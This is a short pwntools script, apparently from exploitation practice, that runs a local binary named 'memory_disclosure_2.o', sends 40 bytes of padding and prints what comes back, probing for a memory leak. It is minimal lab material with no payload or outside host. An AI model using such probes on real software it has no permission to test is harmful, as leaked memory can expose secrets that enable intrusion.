from pwn import *

#context.log_level = 'debug'
r = process('./memory_disclosure_2.o')
r.send(b'a'*40)
#r.recv()
#pause()
print(r.recv())
